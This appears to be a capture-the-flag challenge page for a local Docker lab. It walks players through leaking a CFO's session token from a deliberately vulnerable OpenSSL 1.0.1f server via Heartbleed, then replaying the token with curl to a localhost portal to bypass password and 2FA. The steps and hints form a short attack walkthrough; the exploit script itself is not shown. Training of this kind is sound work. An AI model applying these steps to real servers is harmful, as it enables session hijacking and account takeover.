# Level 3 — Hijack a live session token from the heap

**Category:** attack · **Points:** 300 · **Target:** `vulnerable` (OpenSSL 1.0.1f, port 4433)

## Scenario
In level 1 you stole an employee's **password**. But Secure Corp's senior
accounts don't rely on passwords alone — the CFO's account
(`cfo@securecorp.lab`) is behind **2FA**, so the credentials you leaked before
won't get you in there. It doesn't matter. The CFO is **already signed in**, and
a web session, once established, is just a token the server trusts on sight.

That token is sitting in the vulnerable server's memory right now.

## Your objective
Leak the CFO's **active session token** out of the vulnerable TLS server with
Heartbleed (CVE-2014-0160), then **replay it directly to the portal** to read
their dashboard — **without logging in, without their password, and without
their second factor**. The flag is on the hijacked dashboard.

## What you're given
- `vulnerable` — OpenSSL 1.0.1f TLS server on `vulnerable:4433`. It keeps
  replaying the victim's session token into its own heap, so it's sitting in
  memory waiting to leak (alongside the level-1/2 material).
- `attacker` — the same Heartbleed client as before:
  `attacker/heartbleedExploit.py`. It prints the raw over-read as a hex + ASCII
  dump and extracts nothing for you.
- `webapp` — the portal, published on your host at <http://localhost:8090>. The
  CFO's session is already active in its memory; you just need the token.

## Steps
```bash
# 1. bring the lab up (if it isn't already)
docker compose up --build

# 2. leak memory from the vulnerable server
docker compose exec attacker python3 heartbleedExploit.py vulnerable
#    scan the ASCII column for session=<32 hex chars> — that's the live token
#    run it a few times; it isn't in every over-read

# 3. replay the token straight at the dashboard — no login form
curl -s http://localhost:8090/dashboard -H 'Cookie: session=<leaked-token>'
#    the response greets you as the CFO and prints the flag
```

## Hints
<details><summary>Hint 1</summary>You do <b>not</b> need a username or password for this level. The login form is a dead end for the CFO's account — the token is the whole key.</details>
<details><summary>Hint 2</summary>The value you want looks like <code>session=0123456789abcdef0123456789abcdef</code> (32 hex chars). That is a session id, not a flag.</details>
<details><summary>Hint 3</summary>The portal authorizes <code>/dashboard</code> on the <code>session</code> cookie alone. Send <code>Cookie: session=&lt;token&gt;</code> and you are that user.</details>

## Submitting
```bash
./ctf.sh submit attack-03 'CTF_FLAG{...}'
```
